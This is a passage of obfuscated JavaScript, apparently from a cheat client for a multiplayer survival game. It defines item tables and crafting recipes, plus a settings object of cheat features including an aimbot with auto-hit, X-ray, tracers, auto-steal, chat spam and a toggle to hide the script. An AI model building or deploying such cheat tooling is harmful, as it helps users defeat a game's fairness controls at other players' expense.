  GIFT: a0ENCRyptjson++,
  PENGUIN: a0ENCRyptjson++,
  ALOE_VERA_MOB: a0ENCRyptjson++,
  FIREFLY: a0ENCRyptjson++,
  SPELL: a0ENCRyptjson++,
  FRUIT: a0ENCRyptjson += 9
};
const a0PROMptlog = {
  DELETE: 1,
  HURT: 2,
  COLD: 4,
  HUNGER: 8,
  ATTACK: 16,
  WALK: 32,
  IDLE: 64,
  HEAL: 128,
  WEB: 256
};
const a0NAVIgatecontrol = {
  DAY: 480000,
  WITHOUT_BAG: 10,
  WITH_BAG: 16,
  BAG_SIZE: 6,
  GHOST_DELAY: 60,
  TOP: 1,
  BOTTOM: 2,
  LEFT: 4,
  RIGHT: 8,
  ROTATE: 10,
  DIST_CHEST: 100,
  DIST_FURNACE: 100,
  DIST_WINDMILL: 100,
  DIST_WELL: 100,
  DIST_BREAD_OVEN: 100,
  DIST_SIGN: 100,
  DIST_TOTEM: 100,
  DIST_SIGN: 100,
  DIST_RESURRECTION: 100,
  DIST_EXTRACTOR_MACHINE: 100,
  MODE_PVP: 0,
  MODE_HUNGER_GAMES: 1,
  MODE_ZOMBIES: 2,
  MODE_VAMPIRES: 3,
  MODE_LEGACY: 4,
  MODE_BR: 5,
  MODE_COMMUNITY: 6,
  MODE_EXPERIMENTAL: 7,
  RIVET_GAME_MODES: {
    0: "normal",
    2: "zombies",
    3: "vampires",
    4: "forest",
    7: "experimental"
  },
  ZOMBIE_SKIN: 0,
  VAMPIRE_SKIN: 0,
  ROBOT_SKIN: 30,
  GHOST: 2,
  GHOST_DELAY: 60000,
  WT1SY: 0,
  LWT1SY: 0,
  WT1EY: 50,
  WT2SY: 0,
  LWT2SY: 40,
  WT2EY: 39,
  LWT2: 830,
  FLOAM_X: 25,
  FLOAM_Y: 8,
  W1SX: 0,
  LW1SX: 0,
  W1EX: 200,
  W2SX: 0,
  LW2SX: 250,
  W2EX: 150,
  W3SX: 0,
  LW3SX: 350,
  W3EX: 100,
  LSANDX: 700,
  SEED: 39879
};
const a0INVErttimer = {
  VERSION_NUMBER: 52,
  TIMEOUT_TIME: 2000,
  TIMEOUT_NUMBER: 3,
  PING: "[15]",
  PING_DELAY: 60000,
  ROTATE: 0.2,
  ATTACK: 0.2,
  SLOW_ATTACK: 0.58,
  CAM_DELAY: 50,
  MUTE_DELAY: 125000,
  TIMEOUT_SERVER: 600000,
  WAITING_FOR_SERVER: 8000,
  DELAY_CONNECTION_UPDATE: 5,
  LAG_DISTANCE: 200,
  LOOSE_FOCUS: 15,
  TOKEN_LEN: 14,
  TEAM_MANAGE: 0,
  TEAM_SHOW: 1,
  TEAM_LEAVE: 2,
  TEAM_JOIN: 3,
  TEAM_FULL: 4,
  SKIN_MAX: 20,
  ACCESSORY_MAX: 14,
  SYMBOL_MAX: 4
};
const a0OVERrideclick = {
  CAMPFIRE: 204,
  WOOD_WALL: 264,
  STONE_WALL: 265,
  GOLD_WALL: 266,
  DIAMOND_WALL: 267,
  AMETHYST_WALL: 213,
  REIDITE_WALL: 327,
  WOOD_SPIKE: 262,
  STONE_SPIKE: 270,
  GOLD_SPIKE: 271,
  DIAMOND_SPIKE: 272,
  AMETHYST_SPIKE: 214,
  REIDITE_SPIKE: 329,
  BRIDGE: 216,
  ROOF: 292
};
const a0BUFFeruser = [{
  r: [[a0CONNectloop.WOOD, 20]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.WOOD_WALL,
  id2: a0CONNectloop.WOOD_WALL
}, {
  r: [[a0CONNectloop.WOOD_WALL, 1], [a0CONNectloop.STONE, 17]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.STONE_WALL,
  id2: a0CONNectloop.STONE_WALL
}, {
  r: [[a0CONNectloop.STONE_WALL, 1], [a0CONNectloop.GOLD, 14]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.GOLD_WALL,
  id2: a0CONNectloop.GOLD_WALL
}, {
  r: [[a0CONNectloop.GOLD_WALL, 1], [a0CONNectloop.DIAMOND, 11]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.DIAMOND_WALL,
  id2: a0CONNectloop.DIAMOND_WALL
}, {
  r: [[a0CONNectloop.DIAMOND_WALL, 1], [a0CONNectloop.AMETHYST, 8]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.AMETHYST_WALL,
  id2: a0CONNectloop.AMETHYST_WALL
}, {
  r: [[a0CONNectloop.AMETHYST_WALL, 1], [a0CONNectloop.REIDITE, 5]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.REIDITE_WALL,
  id2: a0CONNectloop.REIDITE_WALL
}, {
  r: [[a0CONNectloop.WOOD_WALL, 1], [a0CONNectloop.WOOD, 20], [a0CONNectloop.STONE, 15]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.WOOD_SPIKE,
  id2: a0CONNectloop.WOOD_SPIKE
}, {
  r: [[a0CONNectloop.STONE_WALL, 1], [a0CONNectloop.STONE, 70]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.STONE_SPIKE,
  id2: a0CONNectloop.STONE_SPIKE
}, {
  r: [[a0CONNectloop.GOLD_WALL, 1], [a0CONNectloop.STONE, 30], [a0CONNectloop.GOLD, 40]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.GOLD_SPIKE,
  id2: a0CONNectloop.GOLD_SPIKE
}, {
  r: [[a0CONNectloop.DIAMOND_WALL, 1], [a0CONNectloop.STONE, 30], [a0CONNectloop.DIAMOND, 40]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.DIAMOND_SPIKE,
  id2: a0CONNectloop.DIAMOND_SPIKE
}, {
  r: [[a0CONNectloop.AMETHYST_WALL, 1], [a0CONNectloop.STONE, 30], [a0CONNectloop.AMETHYST, 40]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.AMETHYST_SPIKE,
  id2: a0CONNectloop.AMETHYST_SPIKE
}, {
  r: [[a0CONNectloop.REIDITE_WALL, 1], [a0CONNectloop.GOLD, 30], [a0CONNectloop.REIDITE, 40]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.REIDITE_SPIKE,
  id2: a0CONNectloop.REIDITE_SPIKE
}, {
  r: [[a0CONNectloop.WOOD, 15]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.BRIDGE,
  id2: a0CONNectloop.BRIDGE
}, {
  r: [[a0CONNectloop.WOOD, 30]],
  w: 1,
  f: 0,
  o: 0,
  e: 0,
  id: a0OVERrideclick.ROOF,
  id2: a0CONNectloop.ROOF
}];
let a0MOUNtrequest = 10000;
const a0NOOPlist = {
  WEAPON_LOADING: ["#FFF", "#FFF"],
  CRATE: 360,
  HURT_DEAD_BOX: 978,
  TREASURE_CHEST: 910,
  HURT_TREASURE_CHEST: 916,
  ICON_LEADER: a0MOUNtrequest++,
  ICON_MEMBER: a0MOUNtrequest++
};
a0ENCRyptjson = 0;
const a0EXPAndgroup = {
  DAY: 0,
  NIGHT: 1,
  ROOF: a0ENCRyptjson++,
  ROOFS: a0ENCRyptjson++,
  BRIDGE: a0ENCRyptjson++,
  HEART_SYMBOL_HUD: a0ENCRyptjson++,
  FOOD_SYMBOL_HUD: a0ENCRyptjson++,
  HUNGER_SYMBOL_HUD: a0ENCRyptjson++,
  WATER_SYMBOL_HUD: a0ENCRyptjson++,
  OXYGEN: a0ENCRyptjson++,
  NEW_GAUGES: a0ENCRyptjson++
};
let a0MINIfydata;
let a0ACCEptstats;
const a0DRAWjob = [];
for (var a0ACCEssresource = 0; a0ACCEssresource < 500; a0ACCEssresource++) {
  a0DRAWjob[a0ACCEssresource] = 0;
}
a0DRAWjob[a0CONNectloop.REIDITE_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.CRAB_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.AMETHYST_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.DIAMOND_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.GOLD_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.STONE_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.WOOD_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.DRAGON_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.LAVA_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.COPPER_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.IRON_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.TOPAZ_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.SAPPHIRE_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.JADE_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.RUBY_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.COAL_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.AQUAMARINE_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.EMERALD_SPEAR] = 1;
a0DRAWjob[a0CONNectloop.WOOD_SWORD] = 1;
a0DRAWjob[a0CONNectloop.STONE_SWORD] = 1;
a0DRAWjob[a0CONNectloop.COPPER_SWORD] = 1;
a0DRAWjob[a0CONNectloop.IRON_SWORD] = 1;
a0DRAWjob[a0CONNectloop.GOLD_SWORD] = 1;
a0DRAWjob[a0CONNectloop.TOPAZ_SWORD] = 1;
a0DRAWjob[a0CONNectloop.DIAMOND_SWORD] = 1;
a0DRAWjob[a0CONNectloop.AMETHYST_SWORD] = 1;
a0DRAWjob[a0CONNectloop.REIDITE_SWORD] = 1;
a0DRAWjob[a0CONNectloop.PIRATE_SWORD] = 1;
a0DRAWjob[a0CONNectloop.SAPPHIRE_SWORD] = 1;
a0DRAWjob[a0CONNectloop.JADE_SWORD] = 1;
a0DRAWjob[a0CONNectloop.RUBY_SWORD] = 1;
a0DRAWjob[a0CONNectloop.COAL_SWORD] = 1;
a0DRAWjob[a0CONNectloop.AQUAMARINE_SWORD] = 1;
a0DRAWjob[a0CONNectloop.EMERALD_SWORD] = 1;
a0DRAWjob[a0CONNectloop.DRAGON_SWORD] = 1;
a0DRAWjob[a0CONNectloop.LAVA_SWORD] = 1;
a0DRAWjob[a0CONNectloop.EMERALD_AXE] = 1;
a0DRAWjob[a0CONNectloop.AQUAMARINE_AXE] = 1;
a0DRAWjob[a0CONNectloop.COAL_AXE] = 1;
a0DRAWjob[a0CONNectloop.RUBY_AXE] = 1;
a0DRAWjob[a0CONNectloop.JADE_AXE] = 1;
a0DRAWjob[a0CONNectloop.SAPPHIRE_AXE] = 1;
a0DRAWjob[a0CONNectloop.REIDITE_AXE] = 1;
a0DRAWjob[a0CONNectloop.AMETHYST_AXE] = 1;
a0DRAWjob[a0CONNectloop.DIAMOND_AXE] = 1;
a0DRAWjob[a0CONNectloop.TOPAZ_AXE] = 1;
a0DRAWjob[a0CONNectloop.GOLD_AXE] = 1;
a0DRAWjob[a0CONNectloop.IRON_AXE] = 1;
a0DRAWjob[a0CONNectloop.COPPER_AXE] = 1;
a0DRAWjob[a0CONNectloop.STONE_AXE] = 1;
a0DRAWjob[a0CONNectloop.WOOD_AXE] = 1;
const a0FETChuser = [];
const a0POSTthread = [a0CONNectloop.LAVA_SWORD, a0CONNectloop.LAVA_SPEAR, a0CONNectloop.DRAGON_SWORD, a0CONNectloop.DRAGON_SPEAR, a0CONNectloop.EMERALD_AXE, a0CONNectloop.EMERALD_SWORD, a0CONNectloop.EMERALD_SPEAR, a0CONNectloop.AQUAMARINE_AXE, a0CONNectloop.AQUAMARINE_SWORD, a0CONNectloop.AQUAMARINE_SPEAR, a0CONNectloop.COAL_AXE, a0CONNectloop.COAL_SWORD, a0CONNectloop.COAL_SPEAR, a0CONNectloop.RUBY_AXE, a0CONNectloop.RUBY_SWORD, a0CONNectloop.RUBY_SPEAR, a0CONNectloop.JADE_AXE, a0CONNectloop.JADE_SWORD, a0CONNectloop.JADE_SPEAR, a0CONNectloop.SAPPHIRE_AXE, a0CONNectloop.SAPPHIRE_SWORD, a0CONNectloop.SAPPHIRE_SPEAR, a0CONNectloop.REIDITE_AXE, a0CONNectloop.REIDITE_SWORD, a0CONNectloop.REIDITE_SPEAR, a0CONNectloop.CRAB_SPEAR, a0CONNectloop.PIRATE_SWORD, a0CONNectloop.AMETHYST_AXE, a0CONNectloop.AMETHYST_SWORD, a0CONNectloop.AMETHYST_SPEAR, a0CONNectloop.DIAMOND_AXE, a0CONNectloop.DIAMOND_SWORD, a0CONNectloop.DIAMOND_SPEAR, a0CONNectloop.TOPAZ_AXE, a0CONNectloop.TOPAZ_SWORD, a0CONNectloop.TOPAZ_SPEAR, a0CONNectloop.GOLD_AXE, a0CONNectloop.GOLD_SWORD, a0CONNectloop.GOLD_SPEAR, a0CONNectloop.IRON_AXE, a0CONNectloop.IRON_SWORD, a0CONNectloop.IRON_SPEAR, a0CONNectloop.COPPER_AXE, a0CONNectloop.COPPER_SWORD, a0CONNectloop.COPPER_SPEAR, a0CONNectloop.STONE_AXE, a0CONNectloop.STONE_SWORD, a0CONNectloop.STONE_SPEAR, a0CONNectloop.WOOD_AXE, a0CONNectloop.WOOD_SWORD, a0CONNectloop.WOOD_SPEAR];
const a0EXPAndpath = [a0CONNectloop.LAVA_HELMET, a0CONNectloop.DRAGON_HELMET, a0CONNectloop.EMERALD_HELMET, a0CONNectloop.AQUAMARINE_HELMET, a0CONNectloop.COAL_HELMET, a0CONNectloop.RUBY_HELMET, a0CONNectloop.JADE_HELMET, a0CONNectloop.SAPPHIRE_HELMET, a0CONNectloop.REIDITE_HELMET, a0CONNectloop.REIDITE_FIRE_PROTECTION_, a0CONNectloop.CRAB_CROWN, a0CONNectloop.AMETHYST_FIRE_PROTECTION_, a0CONNectloop.AMETHYST_HELMET, a0CONNectloop.DIAMOND_FIRE_PROTECTION_, a0CONNectloop.DIAMOND_HELMET, a0CONNectloop.TOPAZ_HELMET, a0CONNectloop.CROWN_OF_LUCK, a0CONNectloop.CROWN_OF_LIFE, a0CONNectloop.CROWN_OF_THE_ANGEL, a0CONNectloop.GOLD_HELMET, a0CONNectloop.IRON_HELMET, a0CONNectloop.COPPER_HELMET, a0CONNectloop.STONE_HELMET, a0CONNectloop.WOOD_HELMET];
const a0DISPatchcommit = [];
for (const a0KEEPjob of a0EXPAndpath) {
  a0DISPatchcommit[a0KEEPjob] = 1;
}
const a0INSErtform = [];
for (const a0CLONeflag of a0POSTthread) {
  a0INSErtform[a0CLONeflag] = 1;
}
const a0KICKcommit = [a0CONNectloop.BERRY, a0CONNectloop.COOKED_MEAT, a0CONNectloop.BREAD, a0CONNectloop.COOKIE, a0CONNectloop.CAKE, a0CONNectloop.FOODFISH_COOKED, a0CONNectloop.SANDWICH, a0CONNectloop.PUMPKIN, a0CONNectloop.GARLIC, a0CONNectloop.CANDY, a0CONNectloop.SUGAR_CANE, a0CONNectloop.CRAB_STICK, a0CONNectloop.TOMATO, a0CONNectloop.CARROT, a0CONNectloop.WATERMELON];
const a0COMPutefolder = {
  [a0CONNectloop.BERRY]: 0.1,
  [a0CONNectloop.MEAT]: 0.15,
  [a0CONNectloop.COOKED_MEAT]: 0.35,
  [a0CONNectloop.BREAD]: 0.15,
  [a0CONNectloop.COOKIE]: 0.5,
  [a0CONNectloop.CAKE]: 1,
  [a0CONNectloop.FISH]: 0.18,
  [a0CONNectloop.FOODFISH_COOKED]: 0.35,
  [a0CONNectloop.SANDWICH]: 1,
  [a0CONNectloop.PUMPKIN]: 0.3,
  [a0CONNectloop.GARLIC]: 0.14,
  [a0CONNectloop.CANDY]: 0.2,
  [a0CONNectloop.SUGAR_CANE]: 1,
  [a0CONNectloop.CRAB_STICK]: 0.2,
  [a0CONNectloop.TOMATO]: 0.16,
  [a0CONNectloop.CARROT]: 0.2,
  [a0CONNectloop.WATERMELON]: 0.15
};
const a0HYDRatejob = [];
const a0OPTImizeoutput = [];
for (const a0KICKarray of a0KICKcommit) {
  a0OPTImizeoutput[a0KICKarray] = 1;
}
for (const a0GETLog of a0KICKcommit) {
  a0HYDRatejob[a0GETLog] = 1;
}
a0HYDRatejob[a0CONNectloop.MEAT] = 1;
a0HYDRatejob[a0CONNectloop.FISH] = 1;
let a0ACKNowledgekey = [];
a0ACKNowledgekey[a0EXPAndgroup.ROOF] = [];
a0ACKNowledgekey[a0EXPAndgroup.ROOF][a0EXPAndgroup.DAY] = a0LOCKsession(a0HANDledata(0.59, true, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
a0ACKNowledgekey[a0EXPAndgroup.ROOF][a0EXPAndgroup.NIGHT] = a0LOCKsession(a0HANDledata(0.59, true, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
a0ACKNowledgekey[a0EXPAndgroup.ROOFS] = [a0ACKNowledgekey[a0EXPAndgroup.ROOF]];
a0ACKNowledgekey[a0EXPAndgroup.ROOFS][1] = [];
a0ACKNowledgekey[a0EXPAndgroup.ROOFS][2] = [];
a0ACKNowledgekey[a0EXPAndgroup.ROOFS][1][a0EXPAndgroup.DAY] = a0LOCKsession(a0HIGHlightthread(0.59, true, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
a0ACKNowledgekey[a0EXPAndgroup.ROOFS][1][a0EXPAndgroup.NIGHT] = a0LOCKsession(a0HIGHlightthread(0.59, true, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
a0ACKNowledgekey[a0EXPAndgroup.ROOFS][2][a0EXPAndgroup.DAY] = a0LOCKsession(a0CREAteobject(0.59, true, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]));
a0ACKNowledgekey[a0EXPAndgroup.ROOFS][2][a0EXPAndgroup.NIGHT] = a0LOCKsession(a0CREAteobject(0.59, true, ["#0c0c0d", "#062124", "#10373d", "#0f3333"]));
a0ACKNowledgekey[a0EXPAndgroup.BRIDGE] = [];
a0ACKNowledgekey[a0EXPAndgroup.BRIDGE][a0EXPAndgroup.DAY] = a0LOCKsession(a0CREAtethread(1, true, ["#1e2021", "#332715", "#4C3B19", "#574122"]));
a0ACKNowledgekey[a0EXPAndgroup.BRIDGE][a0EXPAndgroup.NIGHT] = a0LOCKsession(a0CREAtethread(1, true, ["#0c0c0d", "#071f22", "#0d2e33", "#184747"]));
a0ACKNowledgekey[a0EXPAndgroup.HEART_SYMBOL_HUD] = a0GENErateoutput(0.35, ["#072428", "#67A242", "#67A242"], 0);
a0ACKNowledgekey[a0EXPAndgroup.COLD_SYMBOL_HUD] = a0GENErateoutput(0.35, ["#172130", "#649BB2", "#FFFFFF", "#FFFFFF", "#90C2D3", "#649BB2", "#84BDD1", "#2F5866"], 1);
a0ACKNowledgekey[a0EXPAndgroup.FOOD_SYMBOL_HUD] = a0GENErateoutput(0.35, ["#3F0B11", "#B13424", "#FFFFFF", "#B13424", "#7e180b"], 2);
a0ACKNowledgekey[a0EXPAndgroup.WATER_SYMBOL_HUD] = a0GENErateoutput(0.35, ["#1B2F4C", "#29488E", "#76c3e8", "#ffffff"], 3);
a0ACKNowledgekey[a0EXPAndgroup.NEW_GAUGES] = a0LOCKsession(a0ASSIgnapp(1));
a0ACKNowledgekey[a0EXPAndgroup.OXYGEN] = a0LOCKsession(a0ENDRole(1));
let a0JUMPfile = {
  Aimbot: {
    e: false,
    k: "KeyF",
    angle: null,
    autoHit: true,
    isSmooth: true,
    isAimbotGoldenChicken: true,
    isAimbotRabbit: true
  },
  AutoBook: {
    e: true
  },
  AutoSpike: {
    e: false,
    k: "Space",
    AngleSpread: true,
    angleSpreadMode: "Medium",
    angleSpreadModeOptions: ["Low", "Medium", "High", "360"],
    IsFollowMouse: true,
    p: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"],
    isSpikeInWater: true
  },
  AutoWall: {
    e: false,
    k: "KeyC",
    AngleSpread: true,
    IsFollowMouse: true
  },
  AutoPvP: {
    e: false,
    k: "NONE",
    isPullWeapon: true,
    rangePullWeapon: 100,
    aimbotMode: "Predict",
    aimbotModeList: ["Predict", "Normal"],
    isPullHelmet: true,
    rangePullHelmet: 200,
    minAutoSpikeDistance: 0,
    maxAutoSpikeDistance: 100,
    isAutoSpike: true,
    autospikeMode: "Predict",
    autospikeModeList: ["Predict", "DirectionToEnemy"],
    is360: false,
    autoSpikeWhen: "InRange",
    autoSpikeWhenList: ["PulledGear", "InRange"],
    distanceToChase: 600
  },
  AutoCraft: {
    e: false,
    k: "KeyK"
  },
  AutoCraftSpikes: {
    e: false,
    k: "NONE",
    p: "Highest Craftale"
  },
  AutoRecycle: {
    e: false,
    k: "KeyL"
  },
  AutoReply: {
    e: true,
    IsDelay: false,
    db: {
      lmb: "LMB is LEGENDARY"
    }
  },
  AutoDiving: {
    e: true
  },
  AutoPilot: {
    e: true
  },
  AutoPirateHat: {
    e: true
  },
  AutoPutChest: {
    e: false,
    k: "NONE",
    invIds: []
  },
  AutoTakeChest: {
    e: false,
    k: "NONE",
    invIds: []
  },
  AutoFire: {
    e: false,
    k: "NONE"
  },
  AutoTotem: {
    e: false,
    k: "KeyH"
  },
  VisualHp: {
    e: true,
    animal: true,
    box: true,
    player: true
  },
  BoxInfo: {
    e: true
  },
  ColoredSpike: {
    e: true
  },
  DropWeapon: {
    k: "KeyV"
  },
  FakeDrop: {
    e: false,
    k: "NONE"
  },
  ShowGauges: {
    e: true
  },
  ShowFPS: {
    e: true
  },
  ShowPing: {
    e: true
  },
  ShowHoodName: {
    e: true
  },
  ShowJoinLeave: {
    e: true
  },
  ShowCraftTime: {
    e: true
  },
  Tracers: {
    e: true,
    target: {
      teamate: true,
      enemy: true,
      spider: false,
      wolf: false,
      rabbit: false,
      hawk: false,
      kraken: false,
      sandworm: false,
      lavadragon: false,
      goldenchicken: false
    }
  },
  SpamChat: {
    e: false,
    message: "LMB"
  },
  AutoFood: {
    e: true
  },
  AutoDrink: {
    e: true,
    range: 0.5,
    autoEatWatermelon: false
  },
  ListEnabledHacks: {
    e: true,
    anchor: "BottomLeft"
  },
  Xray: {
    e: false,
    k: "Backquote",
    opacity: 0.5
  },
  Equiq: false,
  Roof: {
    e: true,
    opacity: 0.5
  },
  AutoFarm: {
    e: false,
    k: "KeyU",
    angle: null,
    water: true,
    x: null,
    xx: null,
    y: null,
    yy: null,
    sx: null,
    sy: null,
    dropBeri: false,
    distance: 500,
    cmd: "drop beri",
    isPutBerryToChest: false,
    berryDropPositions: {
      x: null,
      y: null
    },
    chestToPutBerry: {
      pid: null,
      id: null
    },
    berryPutThreshold: 1000
  },
  Debug: {
    e: false,
    showType: false,
    showPID: true,
    showID: true,
    showInfo: true,
    showCoordinates: false,
    showDistance: true,
    showSpeed: false,
    debugRoof: false,
    debugBridge: false,
    fontSize: 16
  },
  AutoCrown: {
    e: true,
    health_to_activate: 100
  },
  AutoIce: {
    e: true,
    eatForHeal: true,
    iceHealTriggerAmount: 200
  },
  ChestInfo: {
    e: true,
    isShowInvId: false
  },
  ExitVehicle: {
    e: false,
    k: "KeyX"
  },
  Token: {
    token: "",
    token_id: ""
  },
  ExtractorTake: {
    e: false,
    k: "NONE"
  },
  ExtractorPut: {
    e: false,
    k: "NONE"
  },
  AutoBreadPut: {
    e: false,
    k: "NONE"
  },
  AutoBreadTake: {
    e: false,
    k: "NONE"
  },
  WorldInfo: {
    e: true
  },
  Spectator: {
    e: false,
    k: "KeyP"
  },
  AutoSteal: {
    e: false,
    k: "KeyQ"
  },
  AutoTame: {
    e: false,
    angle: null
  },
  Market: {
    resourceType: "Wood",
    amount: 1000,
    forestCast: {
      wood: 0,
      stone: 0,
      gold: 0,
      diamond: 0,
      amethyst: 0,
      reidite: 0
    }
  },
  RenderOnTop: {
    e: true,
    box: true,
    player: true,
    treasure_chest: true
  },
  Translator: {
    e: false,
    IncomingMessage: false,
    MyLanguage: "English",
    OutgoingMessage: false,
    TranslateTo: "English"
  },
  Gui: {
    theme: "Default",
    fontSize: 14,
    k: "NONE"
  },
  DrawHpInMyPlayer: {
    e: true,
    Threshold: [40, 100]
  },
  GhostInfo: {
    e: true
  },
  BigZoom: {
    e: true
  },
  BulkItems: {
    e: false,
    k: "CapsLock",
    amount: 100
  },
  SpikeCrafter: {
    e: false,
    k: "NONE",
    target: "Reidite Spike",
    targetOptions: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Nothing"]
  },
  AutoBottleZMA: {
    e: false,
    k: "NONE",
    hpForItemActivation: 60
  },
  AutoHamCmty: {
    e: false,
    k: "NONE",
    angle: null
  },
  AutoGreenCrownCmty: {
    e: false,
    k: "NONE"
  },
  AimbotSpike: {
    e: false,
    k: "NONE",
    distance: 110,
    mode: "SWITCH"
  },
  AutoBuild: {
    e: false,
    k: "KeyT"
  },
  AutoSeed: {
    e: false,
    k: "NONE"
  },
  AutoKsDeadBox: {
    e: false,
    k: "NONE",
    angle: null
  },
  DrawTimerInPlayer: {
    e: true,
    isInMyPlayer: true,
    isInOthers: true
  },
  DrawWeaponSwitchDelay: {
    e: true
  },
  lmbServerUrl: "",
  teamId: "",
  ShowRangeOfWeapon: {
    e: true
  },
  TakeChest: {
    e: false,
    k: "NONE",
    targetChests: []
  },
  PutChest: {
    e: false,
    k: "NONE",
    targetChests: []
  },
  VehicleOpacity: 0.5,
  HoodTimer: {
    e: true,
    color: "#3d2a53"
  },
  AntiHood: {
    e: true,
    angle: null
  },
  ShowLastDead: {
    e: true,
    Pos: null
  },
  ShowTotemInMap: {
    e: true,
    Pos: null
  },
  HideScript: {
    e: false,
    k: "KeyJ"
  },
  ShowMovement: {
    e: true,
    player: true,
    animal: true
  },
  AnimalCounter: {
    e: true
  },
  GaugesUI: "new",
  SmartCraft: {
    e: false,
    mode: "Reditie Spike",
    amount: 1
  }
};
let a0LISTenjob = {
  HPTimer: Date.now(),
  GaugeTimer: Date.now()
};
let a0HYDRatestate = [];
let a0CACHepath = Date.now();
let a0HOOKload = 0;
let a0MINIfyzip;
let a0BUILdresult = -1;
let a0EXPAndresult = null;
let a0HIGHlightfile = null;
let a0OVERrideparser = performance.now();
let a0HOOKuser = performance.now();
let a0DRAWparser = false;
let a0COMPressdata = performance.now();
let a0EXITdrive = false;
let a0EMITtext = false;
let a0INVErtsignature = null;
let a0QUERythread;
let a0OPTImizedrive = false;
const a0DISPatchmode = {
  English: "en",
  Vietnamese: "vi",
  "Chinese (Simplified)": "zh-CN",
  "Chinese (Traditional)": "zh-TW",
  Japanese: "ja",
  Korean: "ko",
  French: "fr",
  German: "de",
  Spanish: "es",
  Russian: "ru",
  Italian: "it",
  Portuguese: "pt",
  Thai: "th",
  Arabic: "ar",
  Hindi: "hi",
  Indonesian: "id",
  Turkish: "tr"
};
let a0INSTalltask = false;
let a0NAVIgatestats = 0;
let a0PARSealive = 0;
let a0DEFErstats = false;
let a0MERGehandler = false;
let a0ASSIgnparser = [];
let a0COMPutetext = 0;
let a0ENCRyptresult = performance.now();
let a0KILLjob = performance.now();
let a0HANDlezip = {};
let a0LOADapp = performance.now();
let a0KILLcache = {
  Join: [],
  Leave: [],
  toggle1: false,
  toggle2: false,
  toggle11: false,
  toggle22: false
};
let a0ENDZip = {};
let a0INSTallkey = performance.now();
let a0FETChfile = performance.now();
let a0JOINfile = null;
let a0POSTqueue = null;
let a0PROCessfile = performance.now();
let a0EMITsocket = performance.now();
let a0OVERridezip = performance.now();
let a0DISPatchdata = performance.now();
let a0DEFErpayload = null;
let a0CACHebuffer = false;
let a0PROCesshandler = null;
let a0KICKstats = false;
let a0BALAncefile = new Image();
a0BALAncefile.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/sandstorm.png";
let a0ENCRyptfocus = new Image();
a0ENCRyptfocus.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/blizzard.png";
let a0MINIfyvalues = false;
let a0FORMatzip = performance.now();
let a0CLOSedrive = false;
let a0KEEPstatus = 0;
let a0KICKsocket = performance.now();
let a0INVErtinput = null;
let a0COMPresssignal = null;
let a0HANDlelog = null;
let a0NOOPuser = false;
let a0GUARdfolder = false;
let a0DEFInestate = null;
let a0DRAWbuffer = {
  key_text: "",
  reply_text: "",
  xTemp: 0,
  yTemp: 0,
  forText: {
    lineWidth: 3,
    sizeText: 30
  },
  max: 10,
  min: -10,
  x1: 0,
  y1: 0,
  x2: 0,
  y2: 0,
  x3: 0,
  y3: 0,
  x4: 0,
  y4: 0,
  invIdToPut: 0,
  invIdToTake: 0,
  radius: 10,
  opacity: 0.75,
  takeChestPidToAdd: 0,
  takeChestIdToAdd: 0,
  putChestInvIdToAdd: 0,
  putChestPidToAdd: 0,
  putChestIdToAdd: 0,
  autopvpLockId: 0
};
let a0KICKclock;
let a0MINIfyspaces;
let a0CLONelog;
let a0MINIfyresult;
let a0GETList;
let USERTOFIX;
let a0DECOdestatus;
let a0ACKNowledgevalue;
// let a0QUEUeschema;
let a0BLOCkparser;
let a0LOADstring;
let a0JUMPcontrol;
let a0INSErtstatus;
let a0BUILdload;
let a0NORMalizequeue;
let a0LOADsocket;
let a0DISPatchinput = 0;
let a0LIMItvalues = 0;
let a0BALAncevalues = 1;
let a0MERGelabel = 1;
let a0QUEUerequest = -1;
let a0EXITinput = Symbol();
let a0PROMptload = {};
let a0LOCKdata = "ws://localhost:8000/ws";
let a0QUEUearray = new a0ACCEssschema();
let a0GENEraterandom = {};
function a0JUMPdisk(e, t) {
  let i = Object.keys(e);
  t.forEach(({
    key: t,
    apply: $
  }) => {
    let o = i.findIndex((t, i) => $(e[t], i));
